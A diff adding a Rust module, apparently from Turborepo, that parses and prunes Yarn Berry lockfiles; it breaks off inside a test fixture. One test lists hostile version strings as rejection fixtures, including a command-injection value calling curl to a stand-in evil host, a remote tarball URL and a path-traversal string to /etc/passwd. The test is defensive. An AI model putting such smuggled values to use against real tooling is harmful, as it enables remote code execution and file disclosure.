@@ -1,0 +1,1493 @@
+mod de;
+mod identifiers;
+mod protocol_resolver;
+mod resolution;
+mod ser;
+
+use std::{
+    any::Any,
+    collections::{HashMap, HashSet},
+    iter,
+    sync::Arc,
+};
+
+use de::Entry;
+use identifiers::{Descriptor, Ident, Locator};
+use protocol_resolver::DescriptorResolver;
+use rustc_hash::FxHashMap;
+use semver::Version;
+use serde::{
+    Deserialize, Serialize,
+    de::{MapAccess, Visitor},
+    ser::SerializeMap,
+};
+use thiserror::Error;
+use turbopath::RelativeUnixPathBuf;
+
+use self::resolution::{Resolution, parse_resolution};
+use super::Lockfile;
+
+#[derive(Debug, Error)]
+pub enum Error {
+    #[error("Unable to parse yaml: {0}")]
+    Parse(#[from] serde_yaml_ng::Error),
+    #[error("Unable to parse identifier: {0}")]
+    Identifiers(#[from] identifiers::Error),
+    #[error("Unable to find original package in patch locator {0}")]
+    PatchMissingOriginalLocator(Locator<'static>),
+    #[error("Unable to parse resolutions field: {0}")]
+    Resolutions(#[from] resolution::Error),
+    #[error("Unable to find entry for {0}")]
+    MissingPackageForLocator(Locator<'static>),
+    #[error("Unable to find descriptors for patch locator {0}")]
+    MissingDescriptorsForPatchLocator(Locator<'static>),
+    #[error("Unable to find any locator for {0}")]
+    MissingLocator(Descriptor<'static>),
+    #[error("Descriptor collision {descriptor} and {other}")]
+    DescriptorCollision {
+        descriptor: Descriptor<'static>,
+        other: String,
+    },
+    #[error("Unable to parse patch descriptor {descriptor} for patch locator {locator}")]
+    InvalidPatchDescriptor {
+        descriptor: Box<Descriptor<'static>>,
+        locator: Box<Locator<'static>>,
+    },
+    #[error("Unable to parse as patch reference: {0}")]
+    InvalidPatchReference(String),
+    #[error("Package '{name}' not found in catalog '{catalog}'")]
+    MissingCatalogEntry { name: String, catalog: String },
+}
+
+// We depend on BTree iteration being sorted for correct serialization
+type Map<K, V> = std::collections::BTreeMap<K, V>;
+
+type CatalogMap = Map<String, Map<String, String>>;
+// See the `overrides` field of `BerryLockfile` for why overrides are grouped
+// by the unscoped name of the dependency they target.
+type OverridesByName = FxHashMap<String, Vec<(Resolution, String)>>;
+type PackageExtensionMap = Map<String, Map<String, String>>;
+type ManifestParts = (Vec<(Resolution, String)>, CatalogMap, PackageExtensionMap);
+
+/// A root manifest's Berry resolution entries in declaration order.
+#[derive(Debug, Clone, Default, PartialEq, Eq)]
+pub struct BerryResolutionMap(Vec<(String, String)>);
+
+impl BerryResolutionMap {
+    pub fn iter(&self) -> impl Iterator<Item = (&String, &String)> {
+        self.0.iter().map(|(key, value)| (key, value))
+    }
+
+    pub fn retain(&mut self, mut predicate: impl FnMut(&String, &String) -> bool) {
+        self.0.retain(|(key, value)| predicate(key, value));
+    }
+}
+
+impl FromIterator<(String, String)> for BerryResolutionMap {
+    fn from_iter<T: IntoIterator<Item = (String, String)>>(iter: T) -> Self {
+        Self(iter.into_iter().collect())
+    }
+}
+
+impl IntoIterator for BerryResolutionMap {
+    type Item = (String, String);
+    type IntoIter = std::vec::IntoIter<Self::Item>;
+
+    fn into_iter(self) -> Self::IntoIter {
+        self.0.into_iter()
+    }
+}
+
+impl<'a> IntoIterator for &'a BerryResolutionMap {
+    type Item = &'a (String, String);
+    type IntoIter = std::slice::Iter<'a, (String, String)>;
+
+    fn into_iter(self) -> Self::IntoIter {
+        self.0.iter()
+    }
+}
+
+impl Serialize for BerryResolutionMap {
+    fn serialize<S: serde::Serializer>(&self, serializer: S) -> Result<S::Ok, S::Error> {
+        let mut map = serializer.serialize_map(Some(self.0.len()))?;
+        for (key, value) in &self.0 {
+            map.serialize_entry(key, value)?;
+        }
+        map.end()
+    }
+}
+
+impl<'de> Deserialize<'de> for BerryResolutionMap {
+    fn deserialize<D: serde::Deserializer<'de>>(deserializer: D) -> Result<Self, D::Error> {
+        struct ResolutionMapVisitor;
+
+        impl<'de> Visitor<'de> for ResolutionMapVisitor {
+            type Value = BerryResolutionMap;
+
+            fn expecting(&self, formatter: &mut std::fmt::Formatter) -> std::fmt::Result {
+                formatter.write_str("a map of Berry resolution selectors to references")
+            }
+
+            fn visit_map<A: MapAccess<'de>>(self, mut map: A) -> Result<Self::Value, A::Error> {
+                let mut entries = Vec::with_capacity(map.size_hint().unwrap_or(0));
+                while let Some((key, value)) = map.next_entry::<String, String>()? {
+                    if let Some((_, existing)) = entries
+                        .iter_mut()
+                        .find(|(existing_key, _)| existing_key == &key)
+                    {
+                        *existing = value;
+                    } else {
+                        entries.push((key, value));
+                    }
+                }
+                Ok(BerryResolutionMap(entries))
+            }
+        }
+
+        deserializer.deserialize_map(ResolutionMapVisitor)
+    }
+}
+
+#[derive(Debug)]
+pub struct BerryLockfile {
+    data: LockfileData,
+    resolutions: Map<Descriptor<'static>, Locator<'static>>,
+    // A mapping from descriptors without protocols to a range with a protocol
+    resolver: DescriptorResolver,
+    locator_package: Map<Locator<'static>, BerryPackage>,
+    // Map of regular locators to patch locators that apply to them
+    patches: Map<Locator<'static>, Locator<'static>>,
+    // Descriptors that come from package extensions.
+    extensions: HashSet<Descriptor<'static>>,
+    // Project-defined package extensions and the descriptors they inject.
+    project_extensions: Vec<(Descriptor<'static>, Vec<Descriptor<'static>>)>,
+    // Package overrides from the root package.json `resolutions` field,
+    // grouped by the unscoped name of the dependency each override targets.
+    // Override matching runs for every dependency edge during lockfile
+    // parsing (`populate_extensions`) and again during transitive closure
+    // calculation, so scanning every override per edge is
+    // O(edges x overrides). Grouping by target name turns that scan into a
+    // single hash lookup per edge. Each bucket preserves root manifest
+    // declaration order so the first matching override wins, and overrides
+    // targeting other names can never
+    // match. `Arc` makes the per-`subgraph` clone a refcount bump.
+    overrides: Arc<OverridesByName>,
+    // Map from workspace paths to package locators
+    workspace_path_to_locator: HashMap<String, Locator<'static>>,
+    // Yarn 4+ catalog support
+    catalogs: Arc<CatalogMap>,
+}
+
+// This is the direct representation of the lockfile as it appears on disk.
+// More internal tracking is required for effectively altering the lockfile
+#[derive(Debug, Clone, Deserialize)]
+#[serde(try_from = "Map<String, Entry>")]
+pub struct LockfileData {
+    metadata: Metadata,
+    packages: Map<String, BerryPackage>,
+}
+
+#[derive(Debug, PartialEq, Eq, Hash, PartialOrd, Ord, Clone)]
+struct Metadata {
+    version: String,
+    cache_key: Option<String>,
+}
+
+#[derive(Debug, PartialEq, Eq, Default, Clone)]
+struct BerryPackage {
+    version: String,
+    language_name: Option<String>,
+    dependencies: Option<Map<String, String>>,
+    peer_dependencies: Option<Map<String, String>>,
+    dependencies_meta: Option<Map<String, DependencyMeta>>,
+    peer_dependencies_meta: Option<Map<String, DependencyMeta>>,
+    // Structured metadata we need to persist
+    bin: Option<Map<String, String>>,
+    link_type: Option<String>,
+    resolution: String,
+    checksum: Option<String>,
+    conditions: Option<String>,
+}
+
+#[derive(Debug, Default, Deserialize, PartialEq, Eq, Hash, PartialOrd, Ord, Clone, Copy)]
+struct DependencyMeta {
+    optional: Option<bool>,
+    unplugged: Option<bool>,
+    built: Option<bool>,
+}
+
+#[derive(Debug, Clone, Deserialize)]
+pub struct BerryManifest {
+    resolutions: Option<BerryResolutionMap>,
+    // Yarn 4+ catalog support - default catalog
+    catalog: Option<Map<String, String>>,
+    // Yarn 4+ catalog support - named catalogs
+    catalogs: Option<Map<String, Map<String, String>>>,
+    // Dependencies injected by project-level packageExtensions.
+    package_extensions: Option<Map<String, Map<String, String>>>,
+}
+
+fn builtin_dependency_extension_is_needed(
+    descriptor: &Descriptor,
+    package_names: &HashSet<String>,
+) -> bool {
+    // https://github.com/yarnpkg/berry/blob/master/packages/yarnpkg-extensions/sources/index.ts
+    descriptor.ident.to_string() == "@babel/types"
+        && descriptor.range == "npm:^7.8.3"
+        && package_names.contains("@babel/parser")
+}
+
+impl BerryLockfile {
+    pub fn load(contents: &[u8], manifest: Option<BerryManifest>) -> Result<Self, super::Error> {
+        let data = LockfileData::from_bytes(contents)?;
+        let lockfile = BerryLockfile::new(data, manifest)?;
+        Ok(lockfile)
+    }
+
+    pub fn new(lockfile: LockfileData, manifest: Option<BerryManifest>) -> Result<Self, Error> {
+        let mut patches = Map::new();
+        let mut locator_package = Map::new();
+        let mut descriptor_locator = Map::new();
+        let mut resolver = DescriptorResolver::default();
+        let mut workspace_path_to_locator = HashMap::new();
+        for (key, package) in &lockfile.packages {
+            let locator = Locator::try_from(package.resolution.as_str())?;
+
+            if locator.patch_file().is_some() {
+                let original_locator = locator
+                    .patched_locator()
+                    .ok_or_else(|| Error::PatchMissingOriginalLocator(locator.as_owned()))?;
+                patches.insert(original_locator.as_owned(), locator.as_owned());
+            }
+
+            locator_package.insert(locator.as_owned(), package.clone());
+
+            if let Some(path) = locator.reference.strip_prefix("workspace:") {
+                workspace_path_to_locator.insert(path.to_string(), locator.as_owned());
+            }
+
+            for descriptor in Descriptor::from_lockfile_key(key) {
+                let descriptor = descriptor?;
+                if let Some(other) = resolver.insert(&descriptor) {
+                    Err(Error::DescriptorCollision {
+                        descriptor: descriptor.clone().into_owned(),
+                        other,
+                    })?;
+                }
+                descriptor_locator.insert(descriptor.into_owned(), locator.as_owned());
+            }
+        }
+
+        let (overrides, catalogs, package_extensions) = if let Some(manifest) = manifest {
+            manifest.into_parts()?
+        } else {
+            (Vec::new(), Map::new(), Map::new())
+        };
+
+        let mut this = Self {
+            data: lockfile,
+            resolutions: descriptor_locator,
+            locator_package,
+            resolver,
+            patches,
+            overrides: Arc::new(group_overrides_by_name(overrides)),
+            extensions: Default::default(),
+            project_extensions: Vec::new(),
+            workspace_path_to_locator,
+            catalogs: Arc::new(catalogs),
+        };
+
+        this.populate_extensions()?;
+        this.populate_project_extensions(package_extensions)?;
+
+        Ok(this)
+    }
+
+    fn populate_extensions(&mut self) -> Result<(), Error> {
+        let mut possible_extensions: HashSet<_> = self
+            .resolutions
+            .keys()
+            .filter(|descriptor| matches!(descriptor.protocol(), Some("npm")))
+            .collect();
+        for (locator, package) in &self.locator_package {
+            for (name, range) in package.dependencies.iter().flatten() {
+                let mut descriptor = self.resolve_dependency(locator, name, range.as_ref())?;
+                if descriptor.protocol().is_none()
+                    && let Some(range) = self.resolver.get(&descriptor)
+                {
+                    descriptor.range = range.into();
+                }
+                possible_extensions.remove(&descriptor);
+            }
+
+            // For Yarn 4, remove any patch sources that are accounted for by a patch
+            if let Some(Locator { ident, reference }) = locator.patched_locator() {
+                possible_extensions.remove(&Descriptor {
+                    ident,
+                    range: reference,
+                });
+            }
+        }
+
+        self.extensions.extend(
+            possible_extensions
+                .into_iter()
+                .map(|desc| desc.clone().into_owned()),
+        );
+        Ok(())
+    }
+
+    fn populate_project_extensions(
+        &mut self,
+        package_extensions: Map<String, Map<String, String>>,
+    ) -> Result<(), Error> {
+        for (selector, dependencies) in package_extensions {
+            let selector = Descriptor::try_from(selector.as_str())?.into_owned();
+            let dependencies = dependencies
+                .into_iter()
+                .map(|(name, range)| {
+                    let mut descriptor = Descriptor::new(&name, &range)?;
+                    if descriptor.protocol().is_none()
+                        && let Some(range) = self.resolver.get(&descriptor)
+                    {
+                        descriptor.range = range.to_string().into();
+                    }
+                    Ok(descriptor.into_owned())
+                })
+                .collect::<Result<Vec<_>, Error>>()?;
+            self.project_extensions.push((selector, dependencies));
+        }
+        Ok(())
+    }
+
+    fn add_extension_descriptor(
+        &self,
+        descriptor: &Descriptor<'static>,
+        resolutions: &mut Map<Descriptor<'static>, Locator<'static>>,
+    ) -> Result<(), Error> {
+        let locator = self
+            .resolutions
+            .get(descriptor)
+            .ok_or_else(|| Error::MissingLocator(descriptor.to_owned()))?;
+        resolutions.insert(descriptor.clone(), locator.clone());
+
+        let mut queue = vec![locator.clone()];
+        while let Some(locator) = queue.pop() {
+            if let Some(package) = self.locator_package.get(&locator) {
+                for (name, range) in package.dependencies.iter().flatten() {
+                    if let Ok(dependency) = self.resolve_dependency(&locator, name, range)
+                        && let Some(dependency_locator) = self.resolutions.get(&dependency)
+                        && !resolutions.contains_key(&dependency)
+                    {
+                        resolutions.insert(dependency, dependency_locator.clone());
+                        queue.push(dependency_locator.clone());
+                    }
+                }
+            }
+        }
+
+        Ok(())
+    }
+
+    // Helper function for inverting the resolution map
+    fn locator_to_descriptors(&self) -> HashMap<&Locator<'static>, HashSet<&Descriptor<'static>>> {
+        let mut reverse_lookup: HashMap<&Locator, HashSet<&Descriptor>> =
+            HashMap::with_capacity(self.locator_package.len());
+
+        for (descriptor, locator) in &self.resolutions {
+            reverse_lookup
+                .entry(locator)
+                .or_default()
+                .insert(descriptor);
+        }
+
+        reverse_lookup
+    }
+
+    /// Constructs a new lockfile data ready to be serialized
+    pub fn lockfile(&self) -> Result<LockfileData, Error> {
+        let mut packages = Map::new();
+        let mut metadata = self.data.metadata.clone();
+        let reverse_lookup = self.locator_to_descriptors();
+
+        for (locator, descriptors) in reverse_lookup {
+            let mut descriptors = descriptors
+                .into_iter()
+                .map(|d| d.to_string())
+                .collect::<Vec<_>>();
+            descriptors.sort();
+            let key = descriptors.join(", ");
+
+            let package = self
+                .locator_package
+                .get(locator)
+                .ok_or_else(|| Error::MissingPackageForLocator(locator.as_owned()))?;
+            packages.insert(key, package.clone());
+        }
+
+        // Yarn v6 (Berry 3.x) strips cacheKey when a pruned subgraph contains
+        // only workspace packages (no checksums). Yarn v8 (Berry 4.x) always
+        // keeps it. Match each version's behavior so frozen installs pass.
+        if metadata.version == "6" {
+            let has_checksum = packages.values().any(|pkg| pkg.checksum.is_some());
+            if !has_checksum {
+                metadata.cache_key = None;
+            }
+        }
+
+        Ok(LockfileData { metadata, packages })
+    }
+
+    /// Produces a new lockfile containing only the given workspaces and
+    /// packages
+    fn subgraph(
+        &self,
+        workspace_packages: &[String],
+        packages: &[String],
+    ) -> Result<BerryLockfile, Error> {
+        let reverse_lookup = self.locator_to_descriptors();
+
+        let mut resolutions = Map::new();
+        let mut patches = Map::new();
+
+        // Include all workspace packages and their references
+        for (locator, package) in &self.locator_package {
+            if workspace_packages
+                .iter()
+                .map(|s| s.as_str())
+                .chain(iter::once("."))
+                .any(|path| locator.is_workspace_path(path))
+            {
+                //  We need to track all of the descriptors coming out the workspace
+                for (name, range) in package.dependencies.iter().flatten() {
+                    let dependency = self.resolve_dependency(locator, name, range.as_ref())?;
+                    let dep_locator = self
+                        .resolutions
+                        .get(&dependency)
+                        .ok_or_else(|| Error::MissingLocator(dependency.clone().into_owned()))?;
+                    resolutions.insert(dependency, dep_locator.clone());
+                }
+
+                // Included workspaces will always have their locator listed as a descriptor.
+                // All other descriptors should show up in the other workspace package
+                // dependencies.
+                resolutions.insert(Descriptor::from(locator.clone()), locator.clone());
+            }
+        }
+
+        for key in packages {
+            let locator = Locator::try_from(key.as_str())?;
+
+            let package = self
+                .locator_package
+                .get(&locator)
+                .cloned()
+                .ok_or_else(|| Error::MissingPackageForLocator(locator.as_owned()))?;
+
+            for (name, range) in package.dependencies.iter().flatten() {
+                let dependency = self.resolve_dependency(&locator, name, range.as_ref())?;
+                let dep_locator = self
+                    .resolutions
+                    .get(&dependency)
+                    .ok_or_else(|| Error::MissingLocator(dependency.clone().into_owned()))?;
+                resolutions.insert(dependency, dep_locator.clone());
+            }
+
+            // If the package has an associated patch we include it in the subgraph
+            if let Some(patch_locator) = self.patches.get(&locator) {
+                patches.insert(locator.as_owned(), patch_locator.clone());
+            }
+
+            // Yarn 4 allows workspaces to depend directly on patched dependencies instead
+            // of using resolutions. This results in the patched dependency appearing in the
+            // closure instead of the original.
+            if locator.patch_file().is_some()
+                && let Some((original, _)) =
+                    self.patches.iter().find(|(_, patch)| patch == &&locator)
+            {
+                patches.insert(original.as_owned(), locator.as_owned());
+                // We include the patched dependency resolution
+                let Locator { ident, reference } = original.as_owned();
+                resolutions.insert(
+                    Descriptor {
+                        ident,
+                        range: reference,
+                    },
+                    original.as_owned(),
+                );
+            }
+        }
+
+        for patch in patches.values() {
+            let patch_descriptors = reverse_lookup
+                .get(patch)
+                .ok_or_else(|| Error::MissingDescriptorsForPatchLocator(patch.clone()))?;
+
+            // For each patch descriptor we extract the primary descriptor that each patch
+            // descriptor targets and check if that descriptor is present in the
+            // pruned map and add it if it is present
+            for patch_descriptor in patch_descriptors {
+                let version = patch_descriptor.primary_version().ok_or_else(|| {
+                    Error::InvalidPatchDescriptor {
+                        descriptor: Box::new((*patch_descriptor).clone()),
+                        locator: Box::new(patch.clone()),
+                    }
+                })?;
+                let primary_descriptor = Descriptor {
+                    ident: patch_descriptor.ident.clone(),
+                    range: version.into(),
+                };
+
+                if resolutions.contains_key(&primary_descriptor) {
+                    resolutions.insert((*patch_descriptor).clone(), patch.clone());
+                }
+            }
+        }
+
+        // Package extension dependencies aren't recorded on the package they extend.
+        // Match their descriptors against reachable peer requirements so merged
+        // lockfile entries retain only the ranges Yarn will reconstruct. Yarn's
+        // @types extensions don't necessarily correspond to peer requirements,
+        // so retain those when their unscoped package is a reachable
+        // dependency.
+        {
+            let mut dependency_names = HashSet::new();
+            let mut package_names = HashSet::new();
+            let mut peer_descriptors = HashSet::new();
+            let mut reachable_locators = Vec::new();
+            for key in packages {
+                if let Ok(package_locator) = Locator::try_from(key.as_str())
+                    && let Some(package) = self.locator_package.get(&package_locator)
+                {
+                    reachable_locators.push(package_locator.clone());
+                    package_names.insert(package_locator.ident.to_string());
+                    for (name, _) in package.dependencies.iter().flatten() {
+                        dependency_names.insert(name.as_str());
+                    }
+                    for (name, range) in package.peer_dependencies.iter().flatten() {
+                        peer_descriptors.insert(self.resolve_dependency(
+                            &package_locator,
+                            name,
+                            range,
+                        )?);
+                    }
+                }
+            }
+            for (package_locator, package) in &self.locator_package {
+                if workspace_packages
+                    .iter()
+                    .map(|path| path.as_str())
+                    .chain(iter::once("."))
+                    .any(|path| package_locator.is_workspace_path(path))
+                {
+                    reachable_locators.push(package_locator.clone());
+                    for (name, _) in package.dependencies.iter().flatten() {
+                        dependency_names.insert(name.as_str());
+                    }
+                    for (name, range) in package.peer_dependencies.iter().flatten() {
+                        peer_descriptors.insert(self.resolve_dependency(
+                            package_locator,
+                            name,
+                            range,
+                        )?);
+                    }
+                }
+            }
+
+            let project_extension_descriptors = self
+                .project_extensions
+                .iter()
+                .filter(|(selector, _)| {
+                    let Ok(range) = node_semver::Range::parse(Descriptor::strip_protocol(
+                        selector.range.as_ref(),
+                    )) else {
+                        return false;
+                    };
+                    reachable_locators.iter().any(|locator| {
+                        locator.ident == selector.ident
+                            && self
+                                .locator_package
+                                .get(locator)
+                                .and_then(|package| {
+                                    node_semver::Version::parse(&package.version).ok()
+                                })
+                                .is_some_and(|version| range.satisfies(&version))
+                    })
+                })
+                .flat_map(|(_, dependencies)| dependencies)
+                .collect::<HashSet<_>>();
+
+            for descriptor in project_extension_descriptors {
+                self.add_extension_descriptor(descriptor, &mut resolutions)?;
+            }
+
+            for descriptor in &self.extensions {
+                let ident = descriptor.ident.to_string();
+                let needed = peer_descriptors.contains(descriptor)
+                    || ident
+                        .strip_prefix("@types/")
+                        .is_some_and(|name| dependency_names.contains(name))
+                    || builtin_dependency_extension_is_needed(descriptor, &package_names);
+
+                if needed {
+                    self.add_extension_descriptor(descriptor, &mut resolutions)?;
+                }
+            }
+        }
+
+        Ok(Self {
+            data: self.data.clone(),
+            resolutions,
+            patches,
+            // We clone the following structures without any alterations and
+            // rely on resolutions being correctly pruned.
+            locator_package: self.locator_package.clone(),
+            resolver: self.resolver.clone(),
+            extensions: self.extensions.clone(),
+            project_extensions: self.project_extensions.clone(),
+            overrides: Arc::clone(&self.overrides),
+            workspace_path_to_locator: self.workspace_path_to_locator.clone(),
+            catalogs: Arc::clone(&self.catalogs),
+        })
+    }
+
+    fn resolve_dependency(
+        &self,
+        locator: &Locator,
+        name: &str,
+        range: &str,
+    ) -> Result<Descriptor<'static>, Error> {
+        // Handle catalog: protocol (Yarn 4+)
+        let resolved_range = if !self.catalogs.is_empty() && range.starts_with("catalog:") {
+            let catalog_spec = &range["catalog:".len()..];
+            // catalog: with no name uses the default catalog
+            let catalog_name = if catalog_spec.is_empty() {
+                "default"
+            } else {
+                catalog_spec
+            };
+
+            // Look up the version in the specified catalog
+            self.catalogs
+                .get(catalog_name)
+                .and_then(|catalog| catalog.get(name))
+                .map(|version| version.as_str())
+                .ok_or_else(|| Error::MissingCatalogEntry {
+                    name: name.to_string(),
+                    catalog: catalog_name.to_string(),
+                })?
+        } else {
+            range
+        };
+
+        let mut dependency = Descriptor::new(name, resolved_range)?;
+        // If there's no protocol we attempt to find a known one
+        if dependency.protocol().is_none()
+            && let Some(range) = self.resolver.get(&dependency)
+        {
+            dependency.range = range.to_string().into();
+        }
+
+        if !self.overrides.is_empty()
+            && let Some(candidates) = self.overrides.get(dependency.ident.name())
+        {
+            for (resolution, reference) in candidates {
+                if let Some(override_dependency) =
+                    resolution.reduce_dependency(reference, &dependency, locator)
+                {
+                    dependency = override_dependency;
+                    break;
+                }
+            }
+        }
+
+        // TODO Could we dedupe and wrap in Rc?
+        Ok(dependency.into_owned())
+    }
+
+    fn locator_for_workspace_path(&self, workspace_path: &str) -> Option<&Locator<'_>> {
+        self.workspace_path_to_locator
+            .get(workspace_path)
+            .or_else(|| {
+                // This is an inefficient fallback we use in case our old logic was catching
+                // edge cases that the eager approach misses.
+                self.locator_package.keys().find(|locator| {
+                    locator.reference.starts_with("workspace:")
+                        && locator.reference.ends_with(workspace_path)
+                })
+            })
+    }
+}
+
+/// Groups overrides by the unscoped name of the dependency they target,
+/// preserving root manifest declaration order within each bucket so the first
+/// matching override wins.
+fn group_overrides_by_name(overrides: Vec<(Resolution, String)>) -> OverridesByName {
+    let mut by_name = OverridesByName::default();
+    for (resolution, reference) in overrides {
+        by_name
+            .entry(resolution.target_name().to_string())
+            .or_default()
+            .push((resolution, reference));
+    }
+    by_name
+}
+
+impl Lockfile for BerryLockfile {
+    #[tracing::instrument(skip(self))]
+    fn resolve_package(
+        &self,
+        workspace_path: &str,
+        name: &str,
+        version: &str,
+    ) -> Result<Option<crate::Package>, crate::Error> {
+        // Retrieving the workspace package is necessary in case there's a
+        // workspace specific override.
+        // In practice, this is extremely silly since changing the version of
+        // the dependency in the workspace's package.json does the same thing.
+        let workspace_locator = self
+            .locator_for_workspace_path(workspace_path)
+            .ok_or_else(|| crate::Error::MissingWorkspace(workspace_path.to_string()))?;
+
+        let dependency = self.resolve_dependency(workspace_locator, name, version)?;
+
+        let Some(locator) = self.resolutions.get(&dependency) else {
+            return Ok(None);
+        };
+
+        let package = self
+            .locator_package
+            .get(locator)
+            .ok_or_else(|| crate::Error::MissingPackage(dependency.to_string()))?;
+
+        Ok(Some(crate::Package {
+            key: locator.to_string(),
+            version: package.version.clone(),
+        }))
+    }
+
+    #[tracing::instrument(skip(self))]
+    fn all_dependencies(
+        &self,
+        key: &str,
+    ) -> Result<
+        Option<std::borrow::Cow<'_, std::collections::BTreeMap<String, String>>>,
+        crate::Error,
+    > {
+        let locator = Locator::try_from(key).map_err(Error::from)?;
+
+        let Some(package) = self.locator_package.get(&locator) else {
+            return Ok(None);
+        };
+
+        let mut map = std::collections::BTreeMap::new();
+        for (name, version) in package.dependencies.iter().flatten() {
+            let mut dependency = Descriptor::new(name, version.as_ref()).map_err(Error::from)?;
+            if !self.overrides.is_empty()
+                && let Some(candidates) = self.overrides.get(dependency.ident.name())
+            {
+                for (resolution, reference) in candidates {
+                    if let Some(override_dependency) =
+                        resolution.reduce_dependency(reference, &dependency, &locator)
+                    {
+                        dependency = override_dependency;
+                        break;
+                    }
+                }
+            }
+            map.insert(dependency.ident.to_string(), dependency.range.to_string());
+        }
+        Ok(Some(std::borrow::Cow::Owned(map)))
+    }
+
+    fn subgraph(
+        &self,
+        workspace_packages: &[String],
+        packages: &[String],
+    ) -> Result<Box<dyn Lockfile>, crate::Error> {
+        let subgraph = self.subgraph(workspace_packages, packages)?;
+        Ok(Box::new(subgraph))
+    }
+
+    fn encode(&self) -> Result<Vec<u8>, crate::Error> {
+        Ok(self.lockfile()?.to_string().into_bytes())
+    }
+
+    fn patches(&self) -> Result<Vec<RelativeUnixPathBuf>, crate::Error> {
+        let mut patches = self
+            .patches
+            .values()
+            .filter_map(|patch| patch.patch_file())
+            .filter(|path| !Locator::is_patch_builtin(path))
+            .map(|s| RelativeUnixPathBuf::new(s.to_string()))
+            .collect::<Result<Vec<_>, turbopath::PathError>>()?;
+        patches.sort();
+        Ok(patches)
+    }
+
+    fn global_change(&self, other: &dyn Lockfile) -> bool {
+        let any_other = other as &dyn Any;
+        if let Some(other) = any_other.downcast_ref::<Self>() {
+            self.data.metadata.version != other.data.metadata.version
+                || self.data.metadata.cache_key != other.data.metadata.cache_key
+        } else {
+            true
+        }
+    }
+
+    fn turbo_version(&self) -> Option<String> {
+        let turbo_ident = Ident::try_from("turbo").ok()?;
+        let key = self
+            .locator_package
+            .keys()
+            .find(|key| turbo_ident == key.ident)?;
+        let entry = self.locator_package.get(key)?;
+        let version = &entry.version;
+        Version::parse(version).ok()?;
+        Some(version.clone())
+    }
+
+    fn human_name(&self, package: &crate::Package) -> Option<String> {
+        let locator = Locator::try_from(package.key.as_str()).ok()?;
+        let berry_package = self.locator_package.get(&locator)?;
+        let name = locator.ident.to_string();
+        let version = &berry_package.version;
+        Some(format!("{name}@{version}"))
+    }
+
+    fn package_source(&self, package: &crate::Package) -> crate::PackageSource {
+        crate::package_source_from_identifier(&package.key)
+    }
+
+    fn format_version(&self) -> Option<String> {
+        Some(self.data.metadata.version.clone())
+    }
+}
+
+impl LockfileData {
+    pub fn from_bytes(s: &[u8]) -> Result<Self, Error> {
+        // Single-pass fast path for the machine-generated subset. Falls
+        // back to serde for anything it declines — including semantic
+        // errors (missing metadata/resolution), so error reporting stays
+        // on the serde path.
+        if let Ok(text) = std::str::from_utf8(s)
+            && let Some(entries) = de::fast_parse::parse(text)
+            && let Ok(data) = Self::try_from(entries)
+        {
+            return Ok(data);
+        }
+        serde_yaml_ng::from_slice(s).map_err(Error::from)
+    }
+}
+
+impl BerryManifest {
+    pub fn new<I>(
+        resolutions: I,
+        catalog: Option<Map<String, String>>,
+        catalogs: Option<Map<String, Map<String, String>>>,
+    ) -> Self
+    where
+        I: IntoIterator<Item = (String, String)>,
+    {
+        let resolutions = Some(resolutions.into_iter().collect());
+        Self {
+            resolutions,
+            catalog,
+            catalogs,
+            package_extensions: None,
+        }
+    }
+
+    pub fn with_package_extensions<I, D>(mut self, package_extensions: I) -> Self
+    where
+        I: IntoIterator<Item = (String, D)>,
+        D: IntoIterator<Item = (String, String)>,
+    {
+        self.package_extensions = Some(
+            package_extensions
+                .into_iter()
+                .map(|(selector, dependencies)| (selector, dependencies.into_iter().collect()))
+                .collect(),
+        );
+        self
+    }
+
+    pub fn with_resolutions<I>(resolutions: I) -> Self
+    where
+        I: IntoIterator<Item = (String, String)>,
+    {
+        Self::new(resolutions, None, None)
+    }
+
+    pub fn into_parts(self) -> Result<ManifestParts, Error> {
+        let overrides = self
+            .resolutions
+            .map(|resolutions| {
+                resolutions
+                    .into_iter()
+                    .map(|(resolution, reference)| {
+                        let res = parse_resolution(&resolution)?;
+                        Ok((res, reference))
+                    })
+                    .collect::<Result<Vec<_>, Error>>()
+            })
+            .transpose()?
+            .unwrap_or_default();
+
+        let mut catalogs = self.catalogs.unwrap_or_default();
+
+        // Add default catalog with "default" as the key
+        if let Some(default_catalog) = self.catalog {
+            catalogs.insert("default".to_string(), default_catalog);
+        }
+
+        Ok((
+            overrides,
+            catalogs,
+            self.package_extensions.unwrap_or_default(),
+        ))
+    }
+}
+
+#[cfg(test)]
+mod test {
+    use super::*;
+
+    #[test]
+    fn test_turbo_version_rejects_non_semver() {
+        // Malicious version strings that could be used for RCE via npx should be
+        // rejected
+        let malicious_versions = [
+            "file:./malicious.tgz",
+            "https://evil.com/malicious.tgz",
+            "git+https://github.com/evil/repo.git",
+            "../../../etc/passwd",
+            "1.0.0 && curl evil.com",
+        ];
+
+        for malicious_version in malicious_versions {
+            // Berry lockfile format has turbo in packages section with version field
+            let yaml = format!(
+                r#"__metadata:
+  version: 6
+  cacheKey: 8c0
+
+"root@workspace:.":
+  version: 0.0.0-use.local
+  resolution: "root@workspace:."
+  languageName: unknown
+  linkType: soft
+
+"turbo@npm:^1.0.0":
+  version: {malicious_version}
+  resolution: "turbo@npm:{malicious_version}"
+  checksum: abc123
+  languageName: node
+  linkType: hard
+"#
+            );
+            let data = LockfileData::from_bytes(yaml.as_bytes()).unwrap();
+            let lockfile = BerryLockfile::new(data, None).unwrap();
+            assert_eq!(
+                lockfile.turbo_version(),
+                None,
+                "should reject malicious version: {}",
+                malicious_version
+            );
+        }
+    }
+
+    #[test]
+    fn test_npm_alias_does_not_resolve_to_workspace() {
+        // Regression test for https://github.com/vercel/turborepo/issues/8989
+        // When a dependency uses `npm:buffer@6.0.3`, it should resolve to the
+        // npm package, not the workspace with the same name.
+        let yaml = r#"__metadata:
+  version: 8
+  cacheKey: 10c0
+
+"a@workspace:packages/a":
+  version: 0.0.0-use.local
+  resolution: "a@workspace:packages/a"
+  dependencies:
+    buffer: "npm:buffer@6.0.3"
+  languageName: unknown
+  linkType: soft
+
+"base64-js@npm:^1.3.1":
+  version: 1.5.1
+  resolution: "base64-js@npm:1.5.1"
+  checksum: 10c0-abc123
+  languageName: node
+  linkType: hard
+
+"root@workspace:.":
+  version: 0.0.0-use.local
+  resolution: "root@workspace:."
+  languageName: unknown
+  linkType: soft
+
+"buffer@npm:buffer@6.0.3":
+  version: 6.0.3
+  resolution: "buffer@npm:6.0.3"
+  dependencies:
+    base64-js: "npm:^1.3.1"
+    ieee754: "npm:^1.2.1"
+  checksum: 10c0-def456
+  languageName: node
+  linkType: hard
+
+"buffer@workspace:packages/buffer":
